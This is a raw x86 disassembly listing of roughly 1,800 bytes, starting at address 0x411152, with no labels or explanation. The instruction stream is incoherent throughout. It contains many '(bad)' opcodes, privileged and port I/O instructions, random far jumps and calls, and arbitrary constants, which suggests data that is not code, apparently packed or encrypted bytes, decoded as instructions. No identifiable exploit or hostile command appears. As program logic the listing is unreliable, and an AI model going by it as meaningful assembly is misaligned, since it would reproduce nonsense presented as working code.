  411152:	int    0x2e
  411154:	sbb    esi,DWORD PTR [edx+eax*4]
  411157:	fmul   QWORD PTR [ebx+esi*4-0x1f]
  41115b:	and    al,0xd7
  41115d:	ret    0x43f2
  411160:	push   0xf32029aa
  411165:	or     dh,BYTE PTR [ebp+ecx*4-0x23970d4c]
  41116c:	push   eax
  41116d:	fwait
  41116e:	mov    cs,WORD PTR [edi-0x1a]
  411171:	pop    ss
  411172:	adc    cl,BYTE PTR [eax]
  411174:	xchg   esp,eax
  411175:	sub    eax,0x69c9eb83
  41117a:	int    0x7e
  41117c:	es in  eax,dx
  41117e:	repnz xor edx,ecx
  411181:	aaa    
  411182:	push   0x18ab4c4e
  411187:	inc    eax
  411188:	dec    eax
  411189:	fistp  DWORD PTR [esi+ebp*4+0xfe66b73]
  411190:	adc    ah,BYTE PTR [ebp+esi*1-0x9]
  411194:	jmp    0xee7e:0xeeb4f885
  41119b:	jmp    0x41115c
  41119d:	or     BYTE PTR [eax],dl
  41119f:	sub    al,0x4d
  4111a1:	add    DWORD PTR [ebp+0x2f646e40],ebp
  4111a7:	or     BYTE PTR [eax],0x9
  4111aa:	cld    
  4111ab:	stc    
  4111ac:	fidiv  WORD PTR [ebp-0x7be745b4]
  4111b2:	loope  0x4111d8
  4111b4:	push   es
  4111b5:	pop    ebx
  4111b6:	retf   0x1620
  4111b9:	mov    ds:0xb143b97d,eax
  4111be:	lods   eax,DWORD PTR ds:[esi]
  4111bf:	ret    
  4111c0:	add    eax,0x83b0b07b
  4111c5:	mov    cl,0x3c
  4111c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111c8:	xchg   ecx,eax
  4111c9:	ins    DWORD PTR es:[edi],dx
  4111ca:	add    DWORD PTR [edx+edi*8-0xfa955f7],eax
  4111d1:	(bad)  
  4111d2:	out    dx,eax
  4111d3:	stos   DWORD PTR es:[edi],eax
  4111d4:	sbb    bh,ch
  4111d6:	sbb    eax,0xbc9e50a1
  4111db:	add    cl,BYTE PTR ds:0x11039e6d
  4111e1:	mov    al,0xda
  4111e3:	or     eax,0xc6a2c373
  4111e8:	cmp    dh,BYTE PTR [esi]
  4111ea:	push   0x742178da
  4111ef:	or     eax,0xc662d176
  4111f4:	add    BYTE PTR [ecx],cl
  4111f6:	loopne 0x4111ee
  4111f8:	das    
  4111f9:	adc    bl,BYTE PTR [edx+0x3a22e65b]
  4111ff:	ficomp WORD PTR [edx]
  411201:	or     al,0xda
  411203:	icebp  
  411204:	fwait
  411205:	pop    edi
  411206:	aam    0xd8
  411208:	pusha  
  411209:	nop
  41120a:	hlt    
  41120b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41120c:	dec    edx
  41120d:	mov    DWORD PTR [edi-0xf6e7b48],edi
  411213:	or     eax,DWORD PTR [edx-0x63]
  411216:	fistp  QWORD PTR [eax]
  411218:	add    BYTE PTR [edx-0x4e],0xe6
  41121c:	fsubr  DWORD PTR [edi]
  41121e:	sub    DWORD PTR [ecx+0x10],0x5f
  411222:	jge    0x4111f0
  411224:	sub    ebp,eax
  411226:	outs   dx,DWORD PTR ds:[esi]
  411227:	inc    ebx
  411228:	ds push ds
  41122a:	cld    
  41122b:	xor    DWORD PTR ds:0x29716ff8,0x1e20d87d
  411235:	sub    DWORD PTR [esp+ebx*2-0x3d],ebx
  411239:	mov    es,WORD PTR [ecx]
  41123b:	pop    ss
  41123c:	call   0x767e5ba9
  411241:	cmp    dh,0x4a
  411244:	xor    BYTE PTR [ecx],0x9f
  411247:	lahf   
  411248:	fyl2x  
  41124a:	sbb    ah,ah
  41124c:	ror    BYTE PTR [ecx+0x52],0xae
  411250:	cmp    DWORD PTR [eax],0xffffffce
  411253:	or     esp,DWORD PTR [ecx]
  411255:	push   esi
  411256:	ror    DWORD PTR [esi],1
  411258:	loopne 0x4111e8
  41125a:	inc    ebx
  41125b:	fs cld 
  41125d:	(bad)  
  41125e:	aad    0x9d
  411260:	inc    edi
  411261:	jns    0x4112bc
  411263:	iret   
  411264:	(bad)  
  411265:	repnz pop ss
  411267:	push   edx
  411268:	jg     0x4112b6
  41126a:	lods   eax,DWORD PTR ds:[esi]
  41126b:	icebp  
  41126c:	adc    edi,esp
  41126e:	inc    ebx
  41126f:	dec    ecx
  411270:	sbb    eax,0x72943c86
  411275:	sub    dh,ch
  411277:	cdq    
  411278:	scas   al,BYTE PTR es:[edi]
  411279:	sub    dh,0x36
  41127c:	pop    ecx
  41127d:	mov    al,0x25
  41127f:	add    BYTE PTR [esi+0x5722b80],dl
  411285:	cwde   
  411286:	loope  0x4112d6
  411288:	sbb    BYTE PTR [eax+ecx*1+0x2b],0xbc
  41128d:	push   0xffffff8c
  41128f:	and    DWORD PTR [edx-0x353536d8],ebx
  411295:	and    BYTE PTR [esi-0x3],bl
  411298:	jne    0x4112ba
  41129a:	shl    BYTE PTR [edi],1
  41129c:	pop    edx
  41129d:	pop    ds
  41129e:	push   ds
  41129f:	mov    eax,0x9457ebf3
  4112a4:	mov    bh,0x24
  4112a6:	and    eax,0x439b9e31
  4112ab:	arpl   WORD PTR [ebx-0x28],si
  4112ae:	or     BYTE PTR [esi+0x58],bl
  4112b1:	mov    ebx,0x2c3337d1
  4112b6:	sub    ch,BYTE PTR [esi]
  4112b8:	pop    ebp
  4112b9:	mov    dl,0xc4
  4112bb:	in     al,dx
  4112bc:	mov    edi,0xa18245f
  4112c1:	(bad)  
  4112c3:	sub    eax,0x629b9633
  4112c8:	jb     0x4112a8
  4112ca:	in     eax,0xad
  4112cc:	arpl   WORD PTR [ecx*1+0x114a1d94],sp
  4112d3:	ja     0x41131f
  4112d5:	jl     0x411335
  4112d7:	mov    al,ds:0x45e3c4b7
  4112dc:	and    esi,DWORD PTR ds:0x8399850d
  4112e2:	int3   
  4112e3:	or     ecx,DWORD PTR [ebx-0x63ab2b77]
  4112e9:	mov    bl,0xec
  4112eb:	sbb    DWORD PTR [edx-0x7821484f],ebp
  4112f1:	aaa    
  4112f2:	adc    eax,0xc6d7ee1d
  4112f7:	dec    edx
  4112f8:	push   esi
  4112f9:	mov    eax,ds:0x671aff24
  4112fe:	push   0xffffff8f
  411300:	mov    ebp,0xc0ab6c9a
  411305:	cmp    ebp,ebx
  411307:	scas   eax,DWORD PTR es:[edi]
  411308:	fsub   st,st(6)
  41130a:	jae    0x411350
  41130c:	xor    al,0x98
  41130e:	mov    ds:0xd16c83ac,al
  411313:	or     DWORD PTR [ecx+edx*8+0x36643cee],ecx
  41131a:	inc    edx
  41131b:	adc    eax,0xe7d4fb51
  411320:	pop    edi
  411321:	lods   eax,DWORD PTR ds:[esi]
  411322:	cmp    eax,ebp
  411324:	mov    ds:0xdf1c4fa3,al
  411329:	int    0xfa
  41132b:	mov    ecx,0x565a0fd1
  411330:	xchg   BYTE PTR [esi+0x43],dh
  411333:	(bad)  
  411335:	jmp    0xc863:0x71d4b669
  41133c:	add    edx,DWORD PTR [eax+0x5b274ebb]
  411342:	(bad)
  411346:	pop    ebp
  411347:	push   esp
  411348:	xor    esp,DWORD PTR [ecx-0xb]
  41134b:	cmp    BYTE PTR [esi-0x7b],ch
  41134e:	jo     0x411343
  411350:	les    eax,FWORD PTR [ebx+0x4d281e31]
  411356:	push   ss
  411357:	mov    eax,ds:0xfc86709a
  41135c:	ret    0x2841
  41135f:	hlt    
  411360:	inc    edx
  411361:	lock xor dl,BYTE PTR [edx]
  411364:	in     eax,dx
  411365:	or     DWORD PTR [ecx-0x4b7ad331],0x34
  41136c:	dec    ebx
  41136d:	popa   
  41136e:	shl    DWORD PTR [edx],0x79
  411371:	jmp    0x899a:0x25bc1588
  411378:	adc    ebx,DWORD PTR [edi]
  41137a:	xchg   esp,eax
  41137b:	dec    ebx
  41137c:	jo     0x4113c0
  41137e:	add    al,0xfb
  411381:	jmp    0x7ce26cdc
  411386:	sub    al,0xef
  411388:	adc    eax,0x37eae0bb
  41138d:	outs   dx,BYTE PTR ds:[esi]
  41138e:	aaa    
  41138f:	xlat   BYTE PTR ds:[ebx]
  411390:	shl    BYTE PTR cs:[edx],1
  411393:	retf   
  411394:	fidivr DWORD PTR [eax]
  411396:	mov    dl,0xfb
  411398:	js     0x411343
  41139a:	sub    dl,ah
  41139c:	mov    ds:0x25f8bf24,al
  4113a1:	mov    ebp,0x4677956b
  4113a6:	fadd   DWORD PTR [ebx]
  4113a8:	pop    edx
  4113a9:	icebp  
  4113aa:	arpl   WORD PTR [eax],sp
  4113ac:	out    dx,al
  4113ad:	dec    esp
  4113ae:	in     al,0x99
  4113b0:	in     al,0x43
  4113b2:	mov    WORD PTR [esi+0x40],es
  4113b5:	xor    al,0x2b
  4113b7:	shl    DWORD PTR [eax],0xc3
  4113ba:	xchg   ebx,eax
  4113bb:	dec    ebx
  4113bc:	scas   eax,DWORD PTR es:[edi]
  4113bd:	jmp    0x72e95076
  4113c2:	gs pop eax
  4113c4:	cmp    DWORD PTR [edx-0x771d08d3],eax
  4113ca:	sbb    edi,DWORD PTR [ebx-0x3943089d]
  4113d0:	inc    ebp
  4113d1:	jnp    0x4113c4
  4113d3:	sub    BYTE PTR [edx],al
  4113d5:	jle    0x4113ce
  4113d7:	int    0x15
  4113d9:	(bad)  
  4113da:	cmp    dl,BYTE PTR [ebx]
  4113dc:	pop    ebp
  4113dd:	mov    edi,DWORD PTR [ecx+0x26]
  4113e0:	jbe    0x411445
  4113e2:	mov    dl,0xcd
  4113e4:	lock outs dx,BYTE PTR ds:[esi]
  4113e6:	in     al,0x74
  4113e8:	dec    esi
  4113e9:	mov    eax,ds:0x972b6821
  4113ee:	jp     0x411423
  4113f0:	jmp    0xc2fe:0x60a27630
  4113f7:	scas   eax,DWORD PTR es:[edi]
  4113f8:	lods   eax,DWORD PTR ds:[esi]
  4113f9:	sbb    BYTE PTR [eax-0x1148b90c],dh
  4113ff:	fidivr WORD PTR [esi+eiz*1-0x6b]
  411403:	inc    edx
  411404:	cld    
  411405:	sbb    BYTE PTR [ebx+0x51],dh
  411408:	lahf   
  411409:	sbb    cl,BYTE PTR [ebx]
  41140b:	xor    esp,ebp
  41140d:	xchg   edx,eax
  41140e:	pop    DWORD PTR [eax]
  411410:	int3   
  411411:	lods   eax,DWORD PTR ds:[esi]
  411412:	cmp    ch,BYTE PTR [ebp-0x62]
  411415:	lds    ebx,FWORD PTR [esi]
  411417:	stc    
  411418:	enter  0xd070,0x71
  41141c:	push   0x61
  41141e:	jnp    0x411471
  411420:	ret    0xacc6
  411423:	stos   DWORD PTR es:[edi],eax
  411424:	lock xor al,0x8b
  411427:	push   edx
  411428:	je     0x411471
  41142a:	loopne 0x411427
  41142c:	mov    cl,0x30
  41142e:	rep outs dx,BYTE PTR ds:[esi]
  411430:	out    0x8a,al
  411432:	jbe    0x411423
  411434:	xchg   ebp,eax
  411435:	ret    
  411436:	push   ebp
  411437:	and    al,0xf8
  411439:	xchg   ebx,eax
  41143a:	or     BYTE PTR [ecx],0xa4
  41143d:	mov    cl,0x9b
  41143f:	aas    
  411440:	fcomp  DWORD PTR [ecx+esi*1-0x79b1c376]
  411447:	add    DWORD PTR [ebp+0x64184015],ebp
  41144d:	inc    ebp
  41144e:	loope  0x41144d
  411450:	and    BYTE PTR [edi+ebx*1+0x5664759a],0x43
  411458:	pop    es
  411459:	mov    esi,0x35c00e6a
  41145e:	in     eax,dx
  41145f:	cmp    BYTE PTR [esi+0x7b],dl
  411462:	ja     0x411484
  411464:	sbb    BYTE PTR [ebx-0x644d4c45],dl
  41146a:	mov    dh,0x69
  41146c:	adc    BYTE PTR [ecx+0x55],dh
  41146f:	std    
  411470:	xor    DWORD PTR [edi],edx
  411472:	xchg   ebp,eax
  411473:	sub    al,0xff
  411475:	aad    0x14
  411477:	dec    ebp
  411478:	pop    esp
  411479:	pop    edx
  41147a:	pop    esp
  41147b:	pop    edi
  41147c:	arpl   WORD PTR [edi],di
  41147e:	scas   eax,DWORD PTR es:[edi]
  41147f:	stos   DWORD PTR es:[edi],eax
  411480:	xor    BYTE PTR [eax-0x69],bh
  411483:	loopne 0x411442
  411485:	imul   esp,DWORD PTR [edx+0x112adeed],0x865b3d2e
  41148f:	imul   ebx,DWORD PTR [ecx+0x5b],0x32
  411493:	jmp    0xf5e82e3
  411498:	push   0xffffffef
  41149a:	shr    BYTE PTR [ecx+0x33],0x9b
  41149e:	and    BYTE PTR [eax+0x4a013d22],bl
  4114a4:	cmp    DWORD PTR [ecx],esp
  4114a6:	sbb    BYTE PTR [ebx+eax*1+0x41],al
  4114aa:	add    DWORD PTR [ebx-0x65],esp
  4114ad:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4114af:	sub    al,0xce
  4114b1:	and    al,0xd8
  4114b3:	dec    edi
  4114b4:	test   BYTE PTR [ecx],bh
  4114b6:	ror    DWORD PTR ds:0x2e91010a,0x4c
  4114bd:	shld   DWORD PTR [edi+0x19552e38],ebx,cl
  4114c4:	out    0xb,eax
  4114c6:	pop    esp
  4114c7:	mov    ebp,0x10c9671d
  4114cc:	xor    BYTE PTR [eax-0x2bff8411],ch
  4114d2:	push   edi
  4114d3:	aad    0x13
  4114d5:	mov    cl,ah
  4114d7:	lds    edx,FWORD PTR [eax]
  4114d9:	test   eax,0x7102daa7
  4114de:	and    DWORD PTR [esi-0x21],edx
  4114e1:	aam    0x9e
  4114e3:	push   ss
  4114e4:	stos   BYTE PTR es:[edi],al
  4114e5:	(bad)  
  4114e6:	adc    ch,ah
  4114e8:	cmp    esi,DWORD PTR [ebp+0x5b102ae]
  4114ee:	aaa    
  4114ef:	fmul   QWORD PTR [esi-0x7e7a9e97]
  4114f5:	inc    esp
  4114f6:	(bad)  
  4114f7:	mov    esi,0xbaccd25d
  4114fc:	inc    edx
  4114fd:	jp     0x4114f4
  4114ff:	adc    eax,esi
  411501:	xlat   BYTE PTR ds:[ebx]
  411502:	shr    BYTE PTR [edi+eax*2-0x1bb9375f],1
  411509:	addr16 dec esi
  41150b:	mov    ds:0x3d451c26,eax
  411510:	sbb    eax,0xef99ec66
  411515:	mov    ch,0x25
  411517:	call   edx
  411519:	dec    ebp
  41151a:	and    DWORD PTR [edi],0x10979802
  411520:	mov    ds:0x293bb39d,eax
  411525:	or     dl,0xbb
  411528:	sbb    BYTE PTR [ebx-0x54],al
  41152b:	out    dx,eax
  41152c:	outs   dx,DWORD PTR ds:[esi]
  41152d:	inc    edx
  41152e:	mov    ebx,DWORD PTR [ebp-0x1f3267bf]
  411534:	shl    BYTE PTR [ebx+0x14],cl
  411537:	popa   
  411538:	rcl    DWORD PTR [edi],0xbf
  41153b:	in     eax,dx
  41153c:	xchg   esp,eax
  41153d:	pop    ss
  41153e:	stos   DWORD PTR es:[edi],eax
  41153f:	adc    eax,DWORD PTR es:[edi]
  411542:	pop    eax
  411543:	mov    edx,0xf4783c51
  411548:	icebp  
  411549:	out    dx,eax
  41154a:	mov    dl,0x1d
  41154c:	add    eax,0x1517f036
  411551:	in     eax,dx
  411552:	cld    
  411553:	xor    esi,DWORD PTR [ebp+0x2da042b5]
  411559:	dec    ecx
  41155a:	repz data16 faddp st(7),st
  41155e:	jns    0x41153d
  411560:	fsubr  QWORD PTR [edx+0x51]
  411563:	inc    ecx
  411564:	adc    DWORD PTR [eax-0x16],edx
  411567:	add    eax,0x5da124a
  41156c:	cmp    al,cl
  41156e:	sbb    al,0xe5
  411570:	aas    
  411571:	cwde   
  411572:	sbb    al,0xb5
  411574:	loope  0x4115aa
  411576:	xchg   ebx,eax
  411577:	popa   
  411578:	or     DWORD PTR ds:0xe7e7fa95,ebp
  41157e:	sub    al,0x4e
  411580:	js     0x411554
  411582:	sub    ecx,esi
  411584:	jnp    0x41157a
  411586:	mov    bl,BYTE PTR [eax]
  411588:	ror    BYTE PTR [ecx],1
  41158a:	icebp  
  41158b:	retf   0xe222
  41158e:	addr16 (bad) 
  411590:	push   ebp
  411591:	push   esp
  411592:	xlat   BYTE PTR ds:[ebx]
  411593:	or     BYTE PTR [edx],cl
  411595:	mov    cl,0xf0
  411597:	dec    edi
  411598:	out    0xbc,al
  41159a:	push   edi
  41159b:	hlt    
  41159c:	jb     0x4115a7
  41159e:	inc    edi
  41159f:	ror    DWORD PTR [ecx+edi*4+0x5ed9178c],cl
  4115a6:	cs (bad) 
  4115a8:	or     dh,ch
  4115aa:	adc    ebp,DWORD PTR [ecx-0x51]
  4115ad:	outs   dx,BYTE PTR ds:[esi]
  4115ae:	fadd   st,st(0)
  4115b0:	mov    ebp,ebp
  4115b2:	jge    0x41155f
  4115b4:	in     eax,dx
  4115b5:	mov    bl,0x58
  4115b7:	cmp    BYTE PTR [edx+0x3d],cl
  4115ba:	(bad)  
  4115bb:	int3   
  4115bc:	xor    eax,0xbdd50701
  4115c1:	ss pop ebx
  4115c3:	xchg   al,ch
  4115c5:	shl    BYTE PTR [esi],cl
  4115c7:	mov    cl,0x83
  4115c9:	jge    0x4115da
  4115cb:	leavew 
  4115cd:	fidivr DWORD PTR [esi-0x44]
  4115d0:	dec    eax
  4115d1:	jo     0x411632
  4115d3:	add    eax,0x8cf46838
  4115d8:	lock sub DWORD PTR [eax+eax*8+0xa],edi
  4115dd:	nop
  4115de:	dec    ebx
  4115df:	mov    dl,0xd8
  4115e1:	in     eax,0xb
  4115e3:	(bad)  
  4115e4:	iret   
  4115e5:	xor    al,BYTE PTR [ecx]
  4115e7:	loope  0x411593
  4115e9:	mov    ecx,0xa34d87f0
  4115ee:	stc    
  4115ef:	dec    edx
  4115f0:	sub    ch,bh
  4115f2:	and    dh,bh
  4115f4:	and    eax,DWORD PTR [ecx-0x426d5c5]
  4115fa:	test   DWORD PTR [edi],0x4075014e
  411600:	pop    es
  411601:	into   
  411602:	fwait
  411603:	stc    
  411604:	cmp    BYTE PTR [ebp-0x6a],bh
  411607:	dec    eax
  411608:	shr    BYTE PTR [eax+0xff1154f],cl
  41160e:	ds mov eax,0xfae6f91e
  411614:	mov    ebx,DWORD PTR [esi+0x7f5f26a5]
  41161a:	test   eax,0x771126a6
  41161f:	pop    ds
  411620:	cmp    BYTE PTR [edi+ebx*8-0x7e045d03],bl
  411627:	push   ecx
  411628:	dec    ebp
  411629:	ins    BYTE PTR es:[edi],dx
  41162a:	or     eax,0x205ede12
  41162f:	shl    BYTE PTR [ebp-0xb],0xd1
  411633:	cmp    dh,BYTE PTR [edi]
  411635:	and    BYTE PTR [edx+0x3f],dh
  411638:	inc    edx
  411639:	or     eax,0x6cfedee7
  41163e:	dec    esi
  41163f:	sub    al,0x53
  411641:	sti    
  411642:	dec    esi
  411643:	out    0x8b,eax
  411645:	xor    bh,BYTE PTR [edx]
  411647:	mov    dl,0xc5
  411649:	push   edi
  41164a:	sub    BYTE PTR ds:0x8100c7f3,0xcf
  411651:	loopne 0x4115ec
  411653:	loope  0x411644
  411655:	cmp    esp,esi
  411657:	pusha  
  411658:	cwde   
  411659:	mov    edx,0x95692d4f
  41165e:	nop
  41165f:	add    esi,eax
  411661:	sti    
  411662:	mov    ds:0x3d83087f,eax
  411667:	cmc    
  411668:	mov    cl,BYTE PTR [ebp+0x36772c82]
  41166e:	cmp    eax,0xee03f522
  411673:	xchg   esi,eax
  411674:	adc    al,0xdc
  411676:	xchg   DWORD PTR [ebx],edi
  411678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411679:	ret    
  41167a:	jmp    0x6393:0x2ca86310
  411681:	daa    
  411682:	add    al,0x9c
  411684:	ret    0xfc88
  411687:	xchg   BYTE PTR [ebx],ah
  411689:	lods   al,BYTE PTR ds:[esi]
  41168a:	lods   al,BYTE PTR ds:[esi]
  41168b:	jnp    0x4116fa
  41168d:	and    BYTE PTR [ebx],ah
  41168f:	dec    edx
  411690:	mov    ebp,0xcbced03c
  411695:	cmc    
  411696:	in     al,0xf9
  411698:	mov    ebp,0xe8eb5a99
  41169d:	cmp    al,0x38
  41169f:	gs retw 
  4116a2:	and    edx,0x46
  4116a5:	push   0xf0492e8d
  4116aa:	sti    
  4116ab:	mov    esp,0x2b250708
  4116b0:	inc    edx
  4116b1:	push   0x60a96f36
  4116b6:	dec    esp
  4116b7:	push   cs
  4116b8:	ds sbb eax,0xc3b7cb02
  4116be:	xchg   esp,eax
  4116bf:	ins    DWORD PTR es:[edi],dx
  4116c0:	mov    ebp,0x5dfe1c2d
  4116c5:	(bad)  
  4116c6:	fisub  WORD PTR [ebp+0x26]
  4116c9:	cwde   
  4116ca:	pusha  
  4116cb:	cmp    BYTE PTR [esi],cl
  4116cd:	xor    eax,0x9e40ed74
  4116d2:	dec    eax
  4116d3:	out    dx,al
  4116d4:	inc    ebx
  4116d5:	sar    DWORD PTR [ecx],0xdd
  4116d8:	dec    ebx
  4116d9:	and    esp,edi
  4116db:	push   eax
  4116dc:	out    dx,al
  4116dd:	dec    eax
  4116de:	out    0xa5,eax
  4116e0:	fs dec esp
  4116e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116e3:	pop    eax
  4116e4:	pop    ebp
  4116e5:	mov    al,ds:0xa35b00b1
  4116ea:	imul   esi,esp,0x84c65e48
  4116f0:	adc    BYTE PTR [ecx-0x33],bl
  4116f3:	aad    0x77
  4116f5:	ss das 
  4116f7:	cdq    
  4116f8:	fisttp DWORD PTR [ecx]
  4116fa:	xor    al,0xd7
  4116fc:	dec    eax
  4116fd:	pop    es
  4116fe:	dec    edi
  4116ff:	(bad)  
  411700:	mov    gs,esp
  411702:	and    eax,0xa427ccc2
  411707:	retf   0xf2
  41170a:	dec    eax
  41170b:	xchg   ecx,eax
  41170c:	sub    esp,ebp
  41170e:	adc    eax,0x95bf977e
  411713:	pop    ss
  411714:	lods   al,BYTE PTR ds:[esi]
  411715:	sbb    BYTE PTR [edi+0x64fbe64b],bh
  41171b:	cmp    BYTE PTR [edx+esi*1+0x20],dl
  41171f:	push   edx
  411720:	xchg   BYTE PTR [eax-0x1536b47],dl
  411726:	out    dx,ax
  411728:	mov    esi,0x4ab0578
  41172d:	push   0xedc23c20
  411732:	addr16 and eax,0x90f1270c
  411738:	sbb    esi,DWORD PTR [eax]
  41173a:	stc    
  41173b:	jge    0x411737
  41173d:	retf   0x27a
  411740:	mov    bl,bh
  411742:	ds lock aad 0xe
  411746:	addr16 jmp 0xc0d1:0x355dc1f9
  41174e:	xchg   edx,eax
  41174f:	test   BYTE PTR [edx+0x5911a45e],ch
  411755:	iret   
  411756:	push   ebx
  411757:	push   edi
  411758:	cmc    
  411759:	push   esi
  41175a:	pop    esi
  41175b:	mov    edx,0xd38d5fd4
  411760:	stc    
  411761:	ja     0x4117da
  411763:	test   DWORD PTR [esi-0x22],esi
  411766:	cmc    
  411767:	dec    eax
  411768:	mov    al,ds:0xdeaa25aa
  41176d:	int    0xea
  41176f:	daa    
  411770:	out    dx,eax
  411771:	pop    ss
  411772:	jp     0x4117c2
  411774:	in     al,dx
  411775:	push   ecx
  411776:	test   esp,0x3fb22dc1
  41177c:	xchg   edx,eax
  41177d:	popa   
  41177e:	mov    BYTE PTR [ebx+0x64072ee3],cl
  411784:	sub    dh,BYTE PTR [edi+0x16]
  411787:	lods   eax,DWORD PTR ds:[esi]
  411788:	mov    ebp,0x129b68c3
  41178d:	inc    esp
  41178e:	es dec esp
  411790:	cmp    BYTE PTR [eax-0x37ece126],0xf2
  411797:	adc    ah,BYTE PTR [edi]
  411799:	clc    
  41179a:	and    al,al
  41179c:	jg     0x411796
  41179e:	loopne 0x411769
  4117a0:	add    al,0xba
  4117a2:	pop    ss
  4117a3:	bound  ebx,QWORD PTR [edi+0x51]
  4117a6:	inc    ebp
  4117a7:	inc    eax
  4117a8:	push   cs
  4117a9:	shl    BYTE PTR [edx],1
  4117ab:	and    bh,BYTE PTR [ecx+eiz*4+0x3d]
  4117af:	jl     0x411826
  4117b1:	or     DWORD PTR [ebx+0x579456e4],edx
  4117b7:	pop    es
  4117b8:	jg     0x411797
  4117ba:	mov    esp,0x17d382bb
  4117bf:	add    edi,eax
  4117c1:	retf   0x704f
  4117c4:	cmp    dh,BYTE PTR ds:[eax+0x951011]
  4117cb:	mov    esp,fs
  4117cd:	pop    ds
  4117ce:	mov    bh,0x51
  4117d0:	scas   al,BYTE PTR es:[edi]
  4117d1:	sar    BYTE PTR [esi+0x1],0x5f
  4117d5:	int    0x48
  4117d7:	mov    edx,0x24aa5c9
  4117dc:	pop    ecx
  4117dd:	jo     0x4117e5
  4117df:	add    eax,DWORD PTR [eax-0x22]
  4117e2:	mov    esi,0xd3eec3a1
  4117e7:	nop
  4117e8:	pop    ebx
  4117e9:	and    al,0xfe
  4117eb:	sub    eax,0xb698f54e
  4117f0:	lea    esi,[esi-0x7fd21d51]
  4117f6:	into   
  4117f7:	fistp  DWORD PTR [esi+ebp*2+0x3f]
  4117fb:	adc    al,bl
  4117fd:	sub    al,BYTE PTR [ebx-0x48]
  411800:	sti    
  411801:	imul   bl
  411803:	mov    edi,0xa8581eaa
  411809:	cmp    esp,ebp
  41180b:	push   0xc0fb2d44
  411810:	loopne 0x4117ea
  411812:	and    eax,0xa8a9ff0d
  411817:	sub    al,0x94
  411819:	push   ebx
  41181a:	inc    edi
  41181b:	and    al,BYTE PTR [ecx+edi*8]
  41181e:	mov    WORD PTR [eax+ebp*8-0x488d83b6],es
  411825:	add    eax,ecx
  411827:	stc    
  411828:	mov    eax,0x837c1ecf
  41182d:	sbb    al,0xa4
  41182f:	add    ecx,DWORD PTR [edx+0x1b]
  411832:	dec    edx
  411833:	test   DWORD PTR [edx+ebp*4-0x303640d9],0xd44cedd
  41183e:	imul   BYTE PTR [ebx-0x4bda9ee2]
  411844:	bound  ebp,QWORD PTR [ebx+ecx*4+0x33]
  411848:	fild   DWORD PTR [ebx]
  41184a:	icebp  
  41184b:	adc    ebx,0xffffffff
  41184e:	xor    edi,edi
  411850:	xor    esi,eax
  411852:	xor    ebx,0x0
  411855:	jmp    0x413be9
  41185a:	pop    ss
  41185b:	push   edx
  41185c:	mov    al,0x83
  41185f:	aam    0xe3
  411861:	imul   ebx,DWORD PTR [eax+0x68],0x8096ba54
  411868:	mov    BYTE PTR [ebx-0xc],bl
  41186b:	push   0x62
  41186d:	(bad)  
  41186e:	jmp    0x4118cf
  411870:	bound  esp,QWORD PTR [edx-0x4d]
  411873:	ja     0x4118bf
  411875:	jmp    0x1ec6291f
  41187a:	sbb    BYTE PTR [ebx-0x53],dh
  41187d:	pop    edi
  41187e:	(bad)  
  41187f:	fild   QWORD PTR [esi-0x69e55168]
  411885:	aaa    
  411886:	repz xor eax,0xd9aaaf81
  41188c:	or     ebx,DWORD PTR [esp+edi*4+0x17e0493]
  411893:	pop    edi
  411894:	xchg   ebx,eax
  411895:	jnp    0x4118e0
  411897:	mov    esp,0x62f6a3fb
  41189c:	outs   dx,DWORD PTR ds:[esi]
  41189d:	mov    al,0x19
  41189f:	stos   DWORD PTR es:[edi],eax
  4118a0:	sub    BYTE PTR [ebp-0x2b],bh
  4118a3:	lock out 0x36,eax
  4118a6:	push   eax
  4118a7:	sbb    eax,0xe6a240ef
  4118ac:	inc    ecx
  4118ad:	into   
  4118ae:	(bad)  
  4118af:	(bad)  
  4118b0:	dec    ebp
  4118b1:	test   ecx,ecx
  4118b3:	add    edx,esi
  4118b5:	pop    eax
  4118b6:	mov    eax,0x91f8e734
  4118bb:	in     eax,dx
  4118bc:	cld    
  4118bd:	shr    BYTE PTR [edx-0x46],cl
  4118c0:	dec    esp
  4118c1:	loop   0x411935
  4118c3:	retf   0x4504
  4118c6:	mov    WORD PTR [ebx],es
  4118c8:	imul   dl
  4118ca:	mov    ch,0x5e
  4118cc:	xlat   BYTE PTR ds:[ebx]
  4118cd:	jle    0x411906
  4118cf:	mov    al,0xcb
  4118d1:	fbld   TBYTE PTR [eax+0x8]
  4118d4:	shl    BYTE PTR [esi+edx*1],0xa3
  4118d8:	pusha  
  4118d9:	cmp    al,0x6f
  4118db:	mov    ds:0xb9a0a445,eax
  4118e0:	xor    bl,BYTE PTR [esi-0x59]
  4118e3:	fstp   st(7)
  4118e5:	push   esp
  4118e7:	pop    ecx
  4118e8:	nop
  4118e9:	retf   
  4118ea:	enter  0xa7c6,0x5
  4118ee:	fucomip st,st(4)
  4118f0:	or     eax,0x71a770cc
  4118f5:	mov    cl,0xeb
  4118f7:	out    0xea,al
  4118f9:	mov    ch,0x37
  4118fb:	mov    al,ds:0x99521355
  411900:	es pop edx
  411902:	lock dec ecx
  411904:	mov    cs:0x35542498,eax
  41190a:	xor    esp,ebx
  41190c:	jge    0x4118d2
  41190e:	call   0xef63:0xc413b89a
  411915:	out    dx,eax
  411916:	stos   BYTE PTR es:[edi],al
  411917:	les    eax,FWORD PTR [edi-0x7d76b490]
  41191d:	add    BYTE PTR [ebp-0x7],ch
  411920:	stos   BYTE PTR es:[edi],al
  411921:	call   0x44bd:0x275273e4
  411928:	and    eax,0xf5db5122
  41192d:	cmc    
  41192e:	dec    ebp
  41192f:	push   es
  411930:	xor    al,0x87
  411932:	xor    esp,DWORD PTR [edi+0x38]
  411935:	or     eax,0x96d5f196
  41193a:	and    ebp,DWORD PTR [ebx]
  41193c:	mov    ah,0x44
  41193e:	xchg   ebx,eax
  41193f:	sti    
  411940:	ja     0x4119a8
  411942:	ins    DWORD PTR es:[edi],dx
  411943:	adc    BYTE PTR [eax+edi*4],dl
  411946:	xor    DWORD PTR [esi-0x45],0x6c
  41194a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41194b:	in     al,dx
  41194c:	in     al,dx
  41194d:	jg     0x4119a1
  41194f:	psubb  mm2,QWORD PTR [eax]
  411952:	test   DWORD PTR [edx+0x36],esi
  411955:	(bad)  [eax]
  411957:	es push esi
  411959:	addr16 pushf 
